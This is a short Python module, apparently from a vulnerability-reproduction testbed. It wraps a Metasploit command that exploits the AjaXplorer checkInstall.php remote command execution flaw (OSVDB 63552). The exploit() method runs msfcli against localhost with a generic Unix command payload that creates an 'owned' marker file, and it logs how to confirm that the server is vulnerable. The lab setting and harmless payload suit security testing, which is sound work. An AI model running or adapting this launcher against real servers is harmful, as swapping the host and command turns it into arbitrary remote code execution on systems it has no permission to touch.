import sys
import os
import time
import urllib
import urllib2
import cookielib

import selenium.common.exceptions
import framework

class Exploit (framework.Exploit):

    attributes = {'Name' :        "OSVDB_63552",
                  'Description' : "AjaXplorer checkInstall.php Remote Command Execution "
                                  "Versions 2.5.5 or older are vulnerable.",
                  'References' :  [['OSVDB', '63552']],
                  'Target' :      "AjaXplorer 2.5.1",
                  'TargetLicense' : '',
                  'VulWikiPage' : "",
                  'Type' : 'EXEC'
                  }

    def __init__(self):
        framework.Exploit.__init__(self)
        return
            
    def exploit(self):
        #driver = self.create_selenium_driver()

        metasploit_cmd = "framework/Exploits/metasploit-framework/msfcli multi/http/ajaxplorer_checkinstall_exec " \
                         "RHOST=127.0.0.1 TARGETURI=/ajaxplorer/ PAYLOAD=cmd/unix/generic CMD=\'touch /var/www/ajaxplorer/files/owned\' E"
        self.logger.info("Running Metasploit")
        os.system(metasploit_cmd)

        self.logger.info("Done! You can safely ignore the last warning from Metasploit, the server is vulnerable.")
        self.logger.info("There should now be a file called \"owned\" under /files when you visit http://localhost/ajaxplorer/#0")
        #driver.cleanup()
        return

    #def cleanup(self, system_dir):
    #    self.logger.info("Removing /var/www/ajaxplorer/owned")
    #    os.system("rm " + system_dir + "/var/www/ajaxplorer/files/owned")
    #    return
